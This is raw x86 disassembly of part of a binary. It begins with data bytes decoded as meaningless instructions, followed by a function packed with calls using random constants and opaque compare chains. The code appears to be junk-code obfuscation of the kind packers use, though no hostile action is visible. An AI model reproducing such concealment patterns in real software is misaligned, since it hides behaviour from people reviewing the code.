  414f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f5a:	add    al,BYTE PTR [eax]
  414f5c:	loop   0x414f05
  414f5e:	add    al,BYTE PTR [eax]
  414f60:	dec    edx
  414f61:	test   al,0x2
  414f63:	add    BYTE PTR [esi],dh
  414f65:	test   al,0x2
  414f67:	add    dl,dl
  414f69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f6a:	add    al,BYTE PTR [eax]
  414f6c:	pop    esp
  414f6d:	test   al,0x2
  414f6f:	add    BYTE PTR [eax],bl
  414f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f72:	add    al,BYTE PTR [eax]
  414f74:	jp     0x414f1c
  414f76:	add    al,BYTE PTR [eax]
  414f78:	push   es
  414f79:	test   al,0x2
  414f7b:	add    BYTE PTR [esi+eiz*4+0x2],bl
  414f7f:	add    BYTE PTR [edx+0x500002a8],al
  414f85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f86:	add    al,BYTE PTR [eax]
  414f88:	push   ds
  414f89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f8a:	add    al,BYTE PTR [eax]
  414f8c:	retf   0x2a6
  414f8f:	add    BYTE PTR [esi+eiz*4],cl
  414f92:	add    al,BYTE PTR [eax]
  414f94:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  414f96:	add    al,BYTE PTR [eax]
  414f98:	test   al,0xa7
  414f9a:	add    al,BYTE PTR [eax]
  414f9c:	xchg   esi,eax
  414f9d:	test   al,0x2
  414f9f:	add    BYTE PTR [eax-0x5bfffd59],al
  414fa5:	test   al,0x2
  414fa7:	add    BYTE PTR [eax+ebp*4-0x5945fffe],bh
  414fae:	add    al,BYTE PTR [eax]
  414fb0:	xchg   edx,eax
  414fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fb2:	add    al,BYTE PTR [eax]
  414fb4:	jb     0x414f5d
  414fb6:	add    al,BYTE PTR [eax]
  414fb8:	ins    BYTE PTR es:[edi],dx
  414fb9:	test   al,0x2
  414fbb:	add    BYTE PTR [edx-0x5a],al
  414fbe:	add    al,BYTE PTR [eax]
  414fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fc1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fc2:	add    al,BYTE PTR [eax]
  414fc4:	mov    edx,0x360002a7
  414fc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fca:	add    al,BYTE PTR [eax]
  414fcc:	int3   
  414fcd:	test   al,0x2
  414fcf:	add    dh,ch
  414fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414fd2:	add    al,BYTE PTR [eax]
  414fd4:	fsub   DWORD PTR [esi-0x580dfffe]
  414fda:	add    al,BYTE PTR [eax]
  414fdc:	mov    ah,BYTE PTR [esi-0x58fffffe]
  414fe2:	add    al,BYTE PTR [eax]
  414fe4:	sbb    BYTE PTR [eax+0x2],ch
  414fea:	add    BYTE PTR [eax],al
  414fec:	repnz test al,0x2
  414fef:	add    ah,ah
  414ff1:	test   al,0x2
  414ff3:	add    BYTE PTR [eax],al
  414ff5:	add    BYTE PTR [eax],al
  414ff7:	add    BYTE PTR [edx],cl
  414ff9:	test   eax,0x2
  414ffe:	add    BYTE PTR [eax],al
  415000:	push   ebp
  415001:	mov    ebp,esp
  415003:	sub    esp,0x50
  415006:	push   0x26
  415008:	push   0x6d
  41500a:	call   0x41798a
  41500f:	add    esp,0x8
  415012:	push   0xc2765600
  415017:	call   0x4177cb
  41501c:	add    esp,0x4
  41501f:	push   ebx
  415020:	push   0x12c90d00
  415025:	call   0x4177cb
  41502a:	add    esp,0x4
  41502d:	push   esi
  41502e:	push   0xffffffbc
  415030:	push   0x4d
  415032:	push   0xffffffdb
  415034:	push   0x6af8d500
  415039:	push   0x28671800
  41503e:	call   0x41798a
  415043:	add    esp,0x14
  415046:	push   0xdaae2c00
  41504b:	push   0x7a254200
  415050:	call   0x4177cb
  415055:	add    esp,0x8
  415058:	push   edi
  415059:	mov    ecx,eax
  41505b:	push   0xf6d3bf00
  415060:	push   0xffffff89
  415062:	push   0x872c600
  415067:	push   0xffffff84
  415069:	call   0x417c22
  41506e:	add    esp,0x10
  415071:	push   0xd8403f00
  415076:	push   0x5f
  415078:	call   0x417c22
  41507d:	add    esp,0x8
  415080:	push   0xc84d3500
  415085:	call   0x417eff
  41508a:	add    esp,0x4
  41508d:	push   0x60
  41508f:	push   0x43
  415091:	push   0x48
  415093:	push   0xa
  415095:	push   0xffffff82
  415097:	call   0x4177cb
  41509c:	add    esp,0x14
  41509f:	push   0xffffffd7
  4150a1:	push   0xffffffdc
  4150a3:	push   0xffffffd6
  4150a5:	call   0x417ddd
  4150aa:	add    esp,0xc
  4150ad:	xor    esi,esi
  4150af:	xor    ebx,ebx
  4150b1:	push   0x26
  4150b3:	call   0x4177cb
  4150b8:	add    esp,0x4
  4150bb:	call   0x417eff
  4150c0:	push   0x68769700
  4150c5:	push   0x98793900
  4150ca:	push   0xffffffe2
  4150cc:	call   0x4177cb
  4150d1:	add    esp,0xc
  4150d4:	push   0x40
  4150d6:	push   0x10
  4150d8:	push   0x8eb51300
  4150dd:	call   0x417eff
  4150e2:	add    esp,0xc
  4150e5:	push   0xffffff83
  4150e7:	push   0x1ea92400
  4150ec:	push   0xffffffd8
  4150ee:	push   0xffffff83
  4150f0:	push   0xf6f11b00
  4150f5:	call   0x417c22
  4150fa:	add    esp,0x14
  4150fd:	push   0xffffffd4
  4150ff:	push   0x66d1bc00
  415104:	call   0x4177cb
  415109:	add    esp,0x8
  41510c:	sub    ebx,eax
  41510e:	push   0x69
  415110:	call   0x417c22
  415115:	add    esp,0x4
  415118:	push   0x42997800
  41511d:	push   0xffffffd9
  41511f:	push   0x82513800
  415124:	call   0x41798a
  415129:	add    esp,0xc
  41512c:	sub    ebx,eax
  41512e:	add    esi,ebx
  415130:	push   0x2e8a1700
  415135:	push   0xe8124000
  41513a:	push   0x47
  41513c:	push   0xffffffb4
  41513e:	call   0x417ddd
  415143:	add    esp,0x10
  415146:	push   0x68755a00
  41514b:	push   0xd6cb2400
  415150:	push   0x68214600
  415155:	call   0x417c22
  41515a:	add    esp,0xc
  41515d:	call   0x417c22
  415162:	push   0x6d4d400
  415167:	push   0x4
  415169:	push   0x30
  41516b:	push   0x96b58500
  415170:	push   0xffffffad
  415172:	call   0x417eff
  415177:	add    esp,0x14
  41517a:	add    esi,esi
  41517c:	push   0x6e85be00
  415181:	push   0xfffffffc
  415183:	push   0xffffffd9
  415185:	call   0x417c22
  41518a:	add    esp,0xc
  41518d:	call   0x417c22
  415192:	push   0x8221ac00
  415197:	push   0xffffffb5
  415199:	push   0xf6869000
  41519e:	call   0x4177cb
  4151a3:	add    esp,0xc
  4151a6:	push   0x19
  4151a8:	push   0xfa618900
  4151ad:	call   0x41798a
  4151b2:	add    esp,0x8
  4151b5:	push   0x27e6e00
  4151ba:	push   0x9
  4151bc:	push   0xc85c8100
  4151c1:	push   0x4232b800
  4151c6:	push   0x46eea900
  4151cb:	call   0x417c22
  4151d0:	add    esp,0x14
  4151d3:	call   0x417c22
  4151d8:	push   0xa6a4d800
  4151dd:	push   0x5a3fba00
  4151e2:	push   0x7ef9f000
  4151e7:	push   0x3e
  4151e9:	call   0x417eff
  4151ee:	add    esp,0x10
  4151f1:	call   0x417ddd
  4151f6:	push   0xa84fb700
  4151fb:	call   0x4177cb
  415200:	add    esp,0x4
  415203:	push   0xfa40be00
  415208:	push   0xaecb3700
  41520d:	call   0x417c22
  415212:	add    esp,0x8
  415215:	push   0x78
  415217:	call   0x41798a
  41521c:	add    esp,0x4
  41521f:	push   0xffffff97
  415221:	call   0x4177cb
  415226:	add    esp,0x4
  415229:	cmp    eax,ebx
  41522b:	je     0x415230
  41522d:	mov    DWORD PTR [ebp-0x48],esi
  415230:	push   0x982b3700
  415235:	push   0xffffffbe
  415237:	push   0x1
  415239:	push   0x1f
  41523b:	push   0x53
  41523d:	call   0x417ddd
  415242:	add    esp,0x14
  415245:	push   0x1e
  415247:	call   0x4177cb
  41524c:	add    esp,0x4
  41524f:	mov    esi,0xd0
  415254:	push   0xffffffda
  415256:	push   0xbef7f800
  41525b:	call   0x41798a
  415260:	add    esp,0x8
  415263:	push   0xae95fe00
  415268:	call   0x4177cb
  41526d:	add    esp,0x4
  415270:	push   0x28
  415272:	push   0xffffffb7
  415274:	call   0x417eff
  415279:	add    esp,0x8
  41527c:	push   0x10
  41527e:	push   0xffffff8d
  415280:	push   0x86f82600
  415285:	push   0xfffffff2
  415287:	push   0x52cabf00
  41528c:	call   0x417c22
  415291:	add    esp,0x14
  415294:	push   0xe80d6700
  415299:	call   0x417ddd
  41529e:	add    esp,0x4
  4152a1:	push   0x5a096100
  4152a6:	call   0x4177cb
  4152ab:	add    esp,0x4
  4152ae:	xor    eax,eax
  4152b0:	add    eax,eax
  4152b2:	push   0xffffff8f
  4152b4:	call   0x4177cb
  4152b9:	add    esp,0x4
  4152bc:	mov    DWORD PTR [ebp-0x20],esi
  4152bf:	push   0x12f0c900
  4152c4:	push   0xffffffe9
  4152c6:	call   0x417eff
  4152cb:	add    esp,0x8
  4152ce:	push   0x23
  4152d0:	push   0xffffffa5
  4152d2:	push   0xa2e78500
  4152d7:	push   0x425e6400
  4152dc:	call   0x41798a
  4152e1:	add    esp,0x10
  4152e4:	sub    eax,esi
  4152e6:	push   0xffffffc7
  4152e8:	push   0x5a7cad00
  4152ed:	push   0x5a7f8400
  4152f2:	call   0x41798a
  4152f7:	add    esp,0xc
  4152fa:	mov    esi,eax
  4152fc:	test   esi,0x5c
  415302:	je     0x415307
  415304:	sub    DWORD PTR [ebp-0x20],esi
  415307:	mov    edi,DWORD PTR [ebp-0x20]
  41530a:	cmp    edi,0x20
  41530d:	jne    0x4153ef
  415313:	push   0x5a630000
  415318:	push   0xffffffb1
  41531a:	push   0x12
  41531c:	push   0xffffffce
  41531e:	call   0x417eff
  415323:	add    esp,0x10
  415326:	push   0x7a40e800
  41532b:	push   0xfffffffd
  41532d:	push   0xd814c600
  415332:	push   0x79
  415334:	push   0x48466d00
  415339:	call   0x4177cb
  41533e:	add    esp,0x14
  415341:	push   0x22
  415343:	push   0xffffff86
  415345:	call   0x417c22
  41534a:	add    esp,0x8
  41534d:	sub    edi,ebx
  41534f:	push   0x78669e00
  415354:	push   0xf697d600
  415359:	push   0x86860500
  41535e:	push   0x3849fa00
  415363:	call   0x4177cb
  415368:	add    esp,0x10
  41536b:	sub    edi,esi
  41536d:	call   0x4177cb
  415372:	push   0xffffffed
  415374:	push   0x48
  415376:	push   0x6a29100
  41537b:	push   0x26d53f00
  415380:	push   0x96c6c900
  415385:	call   0x41798a
  41538a:	add    esp,0x14
  41538d:	push   0xc24bf200
  415392:	push   0x11
  415394:	call   0x417c22
  415399:	add    esp,0x8
  41539c:	push   0x86ae3600
  4153a1:	push   0xffffff88
  4153a3:	push   0xfa109d00
  4153a8:	push   0x2639200
  4153ad:	push   0x76c42900
  4153b2:	call   0x4177cb
  4153b7:	add    esp,0x14
  4153ba:	call   0x417c22
  4153bf:	push   0xfffffff0
  4153c1:	push   0x43
  4153c3:	push   0xceb5fc00
  4153c8:	push   0x10
  4153ca:	push   0x7c
  4153cc:	call   0x417ddd
  4153d1:	add    esp,0x14
  4153d4:	push   0xffffffa8
  4153d6:	push   0xfedd8700
  4153db:	push   0xffffffe7
  4153dd:	push   0x62bdac00
  4153e2:	push   0xffffffe0
  4153e4:	call   0x417c22
  4153e9:	add    esp,0x14
  4153ec:	sub    DWORD PTR [ebp-0x20],edi
  4153ef:	call   0x4177cb
  4153f4:	push   0x5a44d500
  4153f9:	push   0x5a411200
  4153fe:	push   0x1a
  415400:	push   0x6
  415402:	push   0xbeaa6c00
  415407:	call   0x41798a
  41540c:	add    esp,0x14
  41540f:	cmp    ebx,0xffffffb3
  415412:	je     0x415427
  415414:	push   0xffffff92
  415416:	push   0xffffff96
  415418:	push   0x24
  41541a:	push   0x7a485400
  41541f:	call   0x417eff
  415424:	add    esp,0x10
  415427:	or     DWORD PTR [ebp-0x20],edi
  41542a:	push   0x422bca00
  41542f:	push   0xfa7d9700
  415434:	push   0xb29a2800
  415439:	call   0x4177cb
  41543e:	add    esp,0xc
  415441:	add    esi,ebx
  415443:	sub    DWORD PTR [ebp-0x20],esi
  415446:	push   0xffffffae
  415448:	push   0x6d
  41544a:	call   0x417c22
  41544f:	add    esp,0x8
  415452:	add    ebx,eax
  415454:	mov    edx,DWORD PTR [ebp-0x20]
  415457:	call   0x4177cb
  41545c:	push   0x6c25c00
  415461:	push   0x1ed4d500
  415466:	push   0x7d
  415468:	call   0x417c22
  41546d:	add    esp,0xc
  415470:	call   0x4177cb
  415475:	push   0x8386a00
  41547a:	push   0x54
  41547c:	call   0x417ddd
  415481:	add    esp,0x8
  415484:	or     DWORD PTR [ebp-0x20],ebx
  415487:	push   0xffffff8a
  415489:	push   0x56ca6500
  41548e:	push   0x8ab40900
  415493:	push   0x42d47500
  415498:	call   0x4177cb
  41549d:	add    esp,0x10
  4154a0:	push   0xfffffff9
  4154a2:	call   0x417eff
  4154a7:	add    esp,0x4
  4154aa:	mov    DWORD PTR [ebp-0x20],ebx
  4154ad:	push   0x581e3e00
  4154b2:	push   0x1d
  4154b4:	push   0x6ef16000
  4154b9:	push   0x60
  4154bb:	call   0x417ddd
  4154c0:	add    esp,0x10
  4154c3:	push   0xffffff81
  4154c5:	push   0x24
  4154c7:	push   0x2
  4154c9:	push   0x9ee63500
  4154ce:	push   0x68308e00
  4154d3:	call   0x4177cb
  4154d8:	add    esp,0x14
  4154db:	and    eax,edi
  4154dd:	mov    DWORD PTR [ebp-0x20],esi
  4154e0:	push   0xffffffe3
  4154e2:	push   0x3f
  4154e4:	push   0xffffffc5
  4154e6:	push   0xfffffff0
  4154e8:	call   0x417ddd
  4154ed:	add    esp,0x10
  4154f0:	sub    ebx,eax
  4154f2:	push   0xffffffe4
  4154f4:	push   0x16
  4154f6:	push   0xcaff2000
  4154fb:	push   0x5869a800
  415500:	push   0x10
  415502:	call   0x4177cb
  415507:	add    esp,0x14
  41550a:	call   0x41798a
  41550f:	call   0x417ddd
  415514:	mov    edi,DWORD PTR [ebp-0x20]
  415517:	mov    edx,DWORD PTR [ebp-0x20]
  41551a:	cmp    esi,edi
  41551c:	je     0x415570
  41551e:	push   0x8230700
  415523:	push   0xffffffa3
  415525:	call   0x417eff
  41552a:	add    esp,0x8
  41552d:	mov    edx,0x58
  415532:	push   0xffffffc3
  415534:	call   0x417eff
  415539:	add    esp,0x4
  41553c:	add    DWORD PTR [ebp-0x20],edi
  41553f:	cmp    ebx,esi
  415541:	jne    0x415570
  415543:	xor    ecx,ecx
  415545:	mov    eax,DWORD PTR [ebp-0x20]
  415548:	and    ecx,eax
  41554a:	add    DWORD PTR [ebp-0x20],ecx
  41554d:	push   0x7a4fad00
  415552:	push   0xffffffd4
  415554:	push   0xffffffa3
  415556:	push   0x5a51fc00
  41555b:	call   0x417c22
  415560:	add    esp,0x10
  415563:	push   0xffffffd5
  415565:	call   0x41798a
  41556a:	add    esp,0x4
  41556d:	sub    DWORD PTR [ebp-0x20],ebx
  415570:	test   esi,0xf1
  415576:	jne    0x415586
  415578:	push   0x32
  41557a:	push   0xffffffaa
  41557c:	push   0xffffffa9
  41557e:	call   0x417eff
  415583:	add    esp,0xc
  415586:	call   DWORD PTR ds:0x414d68
  41558c:	cmp    eax,DWORD PTR [ebp-0x3c]
  41558f:	je     0x4155a2
  415591:	mov    ecx,0xd4
  415596:	mov    edi,esi
  415598:	add    ecx,esi
  41559a:	mov    DWORD PTR [ebp-0x20],edi
  41559d:	sub    ecx,ebx
  41559f:	add    DWORD PTR [ebp-0x20],ecx
  4155a2:	mov    DWORD PTR [ebp-0x4],eax
  4155a5:	push   0x7
  4155a7:	push   0x5e881600
  4155ac:	push   0xffffffc0
  4155ae:	call   0x417eff
  4155b3:	add    esp,0xc
  4155b6:	push   0x7a7fb600
  4155bb:	push   0x2346900
  4155c0:	call   0x4177cb
  4155c5:	add    esp,0x8
  4155c8:	call   DWORD PTR ds:0x414d74
  4155ce:	mov    edx,DWORD PTR [ebp-0x20]
  4155d1:	sub    edx,esi
  4155d3:	and    edx,edi
  4155d5:	test   edx,0x19
  4155db:	je     0x4156da
  4155e1:	mov    edi,DWORD PTR [ebp-0x20]
  4155e4:	cmp    edi,0x5034
  4155ea:	je     0x4156da
  4155f0:	mov    ecx,DWORD PTR [ebp-0x20]
  4155f3:	cmp    eax,0xf
  4155f6:	je     0x4156da
  4155fc:	mov    esi,DWORD PTR [ebp-0x20]
  4155ff:	sub    esi,edx
  415601:	sub    DWORD PTR [ebp-0x20],esi
  415604:	xor    ebx,ebx
  415606:	cmp    edi,0x6dad
  41560c:	je     0x4156da
  415612:	mov    edx,DWORD PTR [ebp-0x20]
  415615:	add    DWORD PTR [ebp-0x20],ebx
  415618:	mov    esi,DWORD PTR [ebp-0x20]
  41561b:	cmp    eax,ebx
  41561d:	je     0x4156da
  415623:	mov    ebx,DWORD PTR [ebp-0x20]
  415626:	cmp    edi,0x1
  415629:	je     0x4156da
  41562f:	add    ebx,edi
  415631:	sub    DWORD PTR [ebp-0x20],ebx
  415634:	cmp    edx,DWORD PTR [ebp-0x1c]
  415637:	jne    0x4156da
  41563d:	or     edx,eax
  41563f:	cmp    ebx,0x45
  415642:	je     0x4156da
  415648:	xor    ebx,ebx
  41564a:	mov    edi,0x31a6
  41564f:	add    DWORD PTR [ebp-0x20],edi
  415652:	add    DWORD PTR [ebp-0x20],edx
  415655:	sub    DWORD PTR [ebp-0x20],esi
  415658:	cmp    ecx,0x7a4
  41565e:	je     0x4156da
  415660:	mov    edx,edi
  415662:	cmp    ecx,DWORD PTR [ebp-0x10]
  415665:	je     0x4156da
  415667:	add    ebx,edx
  415669:	mov    esi,DWORD PTR [ebp-0x20]
  41566c:	add    DWORD PTR [ebp-0x20],ecx
  41566f:	add    esi,ebx
  415671:	add    esi,edx
  415673:	and    esi,edi
  415675:	mov    edx,DWORD PTR [ebp-0x20]
  415678:	and    edx,ebx
  41567a:	and    edx,eax
  41567c:	cmp    esi,DWORD PTR [ebp-0x44]
  41567f:	jne    0x4156da
  415681:	mov    edi,DWORD PTR [ebp-0x20]
  415684:	mov    ebx,DWORD PTR ds:0x42b040
  41568a:	test   edx,0x9a290482
  415690:	jne    0x4156da
  415692:	mov    ecx,0xedb7
  415697:	and    DWORD PTR [ebp-0x20],ebx
  41569a:	sub    DWORD PTR [ebp-0x20],ecx
  41569d:	mov    ecx,DWORD PTR [ebp-0x20]
  4156a0:	sub    edi,edx
  4156a2:	sub    esi,eax
  4156a4:	sub    DWORD PTR [ebp-0x20],edi
  4156a7:	sub    DWORD PTR [ebp-0x20],eax
  4156aa:	and    esi,eax
  4156ac:	and    esi,eax
  4156ae:	or     esi,ebx
  4156b0:	sub    esi,edx
  4156b2:	cmp    edx,edi
  4156b4:	jne    0x4156da
  4156b6:	cmp    ecx,DWORD PTR [ebp-0x30]
  4156b9:	je     0x4156da
  4156bb:	cmp    esi,0x52d74840
  4156c1:	je     0x4156da
  4156c3:	mov    ebx,ecx
  4156c5:	mov    edx,DWORD PTR ds:0x42b040
  4156cb:	sub    esi,edx
  4156cd:	and    ebx,edx
  4156cf:	add    DWORD PTR [ebp-0x20],ebx
  4156d2:	add    esi,eax
  4156d4:	add    DWORD PTR [ebp-0x20],edi
  4156d7:	add    DWORD PTR [ebp-0x20],esi
  4156da:	mov    DWORD PTR [ebp-0x38],eax
  4156dd:	push   0xaaa8fb00
  4156e2:	push   0x82486400
  4156e7:	push   0x582f0000
  4156ec:	push   0x487af800
  4156f1:	push   0xffffff91
  4156f3:	call   0x41798a
  4156f8:	add    esp,0x14
  4156fb:	push   0xffffffb5
  4156fd:	push   0x4a96bd00
  415702:	push   0x14
  415704:	call   0x4177cb
  415709:	add    esp,0xc
  41570c:	push   0x0
  41570e:	push   0x2200
  415713:	push   0x0
  415715:	call   DWORD PTR ds:0x414e00
  41571b:	test   eax,0x33ae
  415720:	jne    0x415736
  415722:	xor    esi,esi
  415724:	mov    ebx,DWORD PTR [ebp-0x20]
  415727:	add    DWORD PTR [ebp-0x20],ebx
  41572a:	add    edi,esi
  41572c:	add    edi,ebx
  41572e:	sub    DWORD PTR [ebp-0x20],esi
  415731:	sub    edi,esi
  415733:	add    DWORD PTR [ebp-0x20],edi
  415736:	cmp    eax,DWORD PTR [ebp-0x38]
  415739:	je     0x415a22
  41573f:	push   0x33
  415741:	push   0x78
  415743:	push   0xfffffff5
  415745:	push   0x25
  415747:	call   0x4177cb
  41574c:	add    esp,0x10
  41574f:	mov    edi,0x7
  415754:	push   0x7a52d700
  415759:	push   0xad1c100
  41575e:	call   0x417c22
  415763:	add    esp,0x8
  415766:	mov    ecx,0xdb
  41576b:	sub    DWORD PTR [ebp-0x20],edi
  41576e:	add    ecx,edi
  415770:	and    ecx,esi
  415772:	mov    ebx,0xc32e
  415777:	call   0x417ddd
  41577c:	push   0x6afd1600
  415781:	push   0x6ea5da00
  415786:	push   0x68477300
  41578b:	push   0xa6b3fc00
  415790:	call   0x41798a
  415795:	add    esp,0x10
  415798:	push   0x5a215500
  41579d:	push   0xfffffff5
  41579f:	push   0xf
  4157a1:	push   0x41
  4157a3:	push   0xffffffd5
  4157a5:	call   0x4177cb
  4157aa:	add    esp,0x14
  4157ad:	and    DWORD PTR [ebp-0x20],ebx
  4157b0:	add    edi,edi
  4157b2:	add    ebx,edi
  4157b4:	mov    ecx,DWORD PTR [ebp-0x20]
  4157b7:	mov    eax,DWORD PTR [ebp-0x20]
  4157ba:	call   0x417ddd
  4157bf:	push   0xffffffe1
  4157c1:	call   0x417ddd
  4157c6:	add    esp,0x4
  4157c9:	push   0x6ad68c00
  4157ce:	push   0x22c5000
  4157d3:	push   0xffffffd3
  4157d5:	push   0x3f
  4157d7:	push   0x2809d300
  4157dc:	call   0x4177cb
  4157e1:	add    esp,0x14
  4157e4:	sub    DWORD PTR [ebp-0x20],ebx
  4157e7:	push   0x5ad2f400
  4157ec:	push   0x26aa8800
  4157f1:	push   0xffffffda
  4157f3:	push   0x5a
  4157f5:	call   0x417c22
  4157fa:	add    esp,0x10
  4157fd:	sub    DWORD PTR [ebp-0x20],ebx
  415800:	push   0x61
  415802:	push   0xffffffd2
  415804:	push   0x2ea6c700
  415809:	push   0x2f
  41580b:	push   0x2a
  41580d:	call   0x41798a
  415812:	add    esp,0x14
  415815:	xor    ecx,ecx
  415817:	mov    eax,0xa0
  41581c:	mov    ebx,DWORD PTR [ebp-0x20]
  41581f:	and    eax,ebx
  415821:	cmp    eax,ebx
  415823:	jne    0x415851
  415825:	xor    ebx,ebx
  415827:	sub    eax,ebx
  415829:	mov    esi,ebx
  41582b:	cmp    eax,DWORD PTR [ebp-0x30]
  41582e:	jne    0x415851
  415830:	and    esi,ecx
  415832:	and    esi,eax
  415834:	sub    esi,ecx
  415836:	cmp    esi,DWORD PTR [ebp-0x44]
  415839:	je     0x415851
  41583b:	mov    ebx,DWORD PTR [ebp-0x20]
  41583e:	sub    esi,eax
  415840:	cmp    esi,eax
  415842:	jne    0x415851
  415844:	mov    eax,esi
  415846:	mov    esi,DWORD PTR [ebp-0x20]
  415849:	sub    esi,ebx
  41584b:	mov    DWORD PTR [ebp-0x20],esi
  41584e:	sub    DWORD PTR [ebp-0x20],eax
  415851:	sub    DWORD PTR [ebp-0x20],ebx
  415854:	sub    edi,ecx
  415856:	sub    esi,ebx
  415858:	mov    edx,ecx
  41585a:	mov    eax,DWORD PTR [ebp-0x20]
  41585d:	add    edx,edi
  41585f:	cmp    eax,0x76b8
  415864:	jne    0x415893
  415866:	sub    DWORD PTR [ebp-0x20],edx
  415869:	mov    ebx,0xe2a6
  41586e:	cmp    eax,0x3d
  415871:	jne    0x415893
  415873:	mov    edx,0xfd
  415878:	sub    DWORD PTR [ebp-0x20],edx
  41587b:	mov    DWORD PTR [ebp-0x20],eax
  41587e:	and    DWORD PTR [ebp-0x20],ebx
  415881:	mov    edx,0xf0
  415886:	add    esi,edx
  415888:	cmp    esi,DWORD PTR ds:0x42b040
  41588e:	je     0x415893
  415890:	or     DWORD PTR [ebp-0x20],esi
  415893:	sub    DWORD PTR [ebp-0x20],ecx
  415896:	add    edi,edi
  415898:	mov    eax,0xd3
  41589d:	add    eax,esi
  41589f:	or     eax,ecx
  4158a1:	cmp    eax,DWORD PTR ds:0x42b040
  4158a7:	je     0x4158ec
  4158a9:	and    eax,esi
  4158ab:	xor    esi,esi
  4158ad:	mov    edx,0x6d
  4158b2:	sub    DWORD PTR [ebp-0x20],edi
  4158b5:	mov    DWORD PTR [ebp-0x20],edx
  4158b8:	or     DWORD PTR [ebp-0x20],eax
  4158bb:	add    DWORD PTR [ebp-0x20],ebx
  4158be:	xor    DWORD PTR [ebp-0x20],ebx
  4158c1:	add    DWORD PTR [ebp-0x20],edi
  4158c4:	add    esi,ebx
  4158c6:	sub    edx,eax
  4158c8:	cmp    edx,DWORD PTR ds:0x42b040
  4158ce:	je     0x4158ec
  4158d0:	mov    eax,0xed
  4158d5:	and    edx,esi
  4158d7:	add    eax,edi
  4158d9:	xor    ebx,ebx
  4158db:	cmp    edx,0xffffffd4
  4158de:	jne    0x4158ec
  4158e0:	mov    esi,edx
  4158e2:	mov    edx,ebx
  4158e4:	sub    edx,eax
  4158e6:	sub    DWORD PTR [ebp-0x20],edx
  4158e9:	sub    DWORD PTR [ebp-0x20],esi
  4158ec:	mov    eax,DWORD PTR [ebp-0x20]
  4158ef:	xor    ebx,ebx
  4158f1:	or     DWORD PTR [ebp-0x20],ebx
  4158f4:	xor    DWORD PTR [ebp-0x20],eax
  4158f7:	or     edi,ecx
  4158f9:	add    ebx,ebx
  4158fb:	push   0xfa49a600
  415900:	push   0x7af30b00
  415905:	push   0xfffffff3
  415907:	push   0x13
  415909:	call   0x41798a
  41590e:	add    esp,0x10
  415911:	push   0xffffffa3
  415913:	push   0x5851da00
  415918:	call   0x417eff
  41591d:	add    esp,0x8
  415920:	push   0x52
  415922:	call   0x417ddd
  415927:	add    esp,0x4
  41592a:	push   0xc69d6300
  41592f:	push   0x4c
  415931:	push   0x23ad000
  415936:	call   0x417ddd
  41593b:	add    esp,0xc
  41593e:	mov    esi,DWORD PTR ds:0x42b040
  415944:	push   0x78262400
  415949:	call   0x417ddd
  41594e:	add    esp,0x4
  415951:	push   0xffffff9b
  415953:	push   0x728eee00
  415958:	push   0xffffffcd
  41595a:	push   0xb2bfd900
  41595f:	push   0xffffffce
  415961:	call   0x417eff
  415966:	add    esp,0x14
  415969:	push   0x45
  41596b:	call   0x41798a
  415970:	add    esp,0x4
  415973:	and    ebx,edi
  415975:	mov    edx,DWORD PTR [ebp-0x20]
  415978:	push   0x4c
  41597a:	push   0x46c90900
  41597f:	push   0x54
  415981:	push   0x52c0a500
  415986:	push   0x42135200
  41598b:	call   0x41798a
  415990:	add    esp,0x14
  415993:	and    ebx,edi
  415995:	push   0x5f
  415997:	push   0x5a791a00
  41599c:	push   0xffffffb3
  41599e:	push   0xc229a500
  4159a3:	push   0x5f
  4159a5:	call   0x4177cb
  4159aa:	add    esp,0x14
  4159ad:	push   0x51
  4159af:	push   0x7a3e6b00
  4159b4:	push   0x22e37b00
  4159b9:	push   0x66931c00
  4159be:	push   0x5d
  4159c0:	call   0x4177cb
  4159c5:	add    esp,0x14
  4159c8:	push   0x38076800
  4159cd:	call   0x417c22
  4159d2:	add    esp,0x4
  4159d5:	push   0x11
  4159d7:	push   0x6870fc00
  4159dc:	push   0x7a83bf00
  4159e1:	push   0xc8552b00
  4159e6:	call   0x417eff
  4159eb:	add    esp,0x10
  4159ee:	and    DWORD PTR [ebp-0x20],ebx
  4159f1:	push   0x5ee0f400
  4159f6:	call   0x417ddd
  4159fb:	add    esp,0x4
  4159fe:	call   0x417ddd
  415a03:	add    DWORD PTR [ebp-0x20],esi
  415a06:	and    DWORD PTR [ebp-0x20],ebx
  415a09:	call   0x417eff
  415a0e:	mov    DWORD PTR [ebp-0x10],edi
  415a11:	push   0x14
  415a13:	push   0x42bf4800
  415a18:	push   0xffffffbd
  415a1a:	call   0x417ddd
  415a1f:	add    esp,0xc
  415a22:	push   0xfffffff3
  415a24:	push   0x4ac32f00
  415a29:	push   0x4eacde00
  415a2e:	push   0x5e
  415a30:	push   0x427ffe00
  415a35:	call   0x4177cb
  415a3a:	add    esp,0x14
  415a3d:	push   0x72
  415a3f:	push   0x7a432200
  415a44:	push   0x3af8e500
  415a49:	push   0x1e
  415a4b:	push   0x68
  415a4d:	call   0x417c22
  415a52:	add    esp,0x14
  415a55:	mov    edx,0x54
  415a5a:	push   0xffffffbb
  415a5c:	push   0x4a
  415a5e:	push   0x82076000
  415a63:	push   0xb8114600
  415a68:	call   0x417ddd
  415a6d:	add    esp,0x10
  415a70:	push   0xffffffb5
  415a72:	call   0x417ddd
  415a77:	add    esp,0x4
  415a7a:	or     eax,ebx
  415a7c:	sub    eax,esi
  415a7e:	add    DWORD PTR [ebp-0x20],eax
  415a81:	push   0x36
  415a83:	call   0x4177cb
  415a88:	add    esp,0x4
  415a8b:	xor    edi,edi
  415a8d:	push   0xf8455000
  415a92:	push   0xffffffbf
  415a94:	call   0x41798a
  415a99:	add    esp,0x8
  415a9c:	mov    edx,esi
  415a9e:	push   0x56acd500
  415aa3:	push   0xffffff88
  415aa5:	push   0xb83d8a00
  415aaa:	push   0xffffffb2
  415aac:	push   0xc20d7a00
  415ab1:	call   0x417c22
